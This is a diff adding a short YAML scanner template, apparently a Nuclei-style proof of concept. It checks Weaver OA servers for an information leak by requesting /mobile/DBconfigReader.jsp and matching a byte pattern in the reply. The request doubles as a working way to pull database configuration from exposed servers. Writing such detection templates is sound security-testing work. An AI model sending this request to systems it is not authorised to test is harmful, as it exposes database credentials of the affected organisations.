@@ -1,0 +1,15 @@
+id: poc-yaml-weaver-mobile-dbconfig-reader-info-leak
+info:
+  name: Weaver OA Mobile DBconfigReader Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mobile/DBconfigReader.jsp"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "\\r\\n\\r\\n\\r\\n\\r\\n\\x8a\\xd2\\xf1\\xd4\\x98~p"
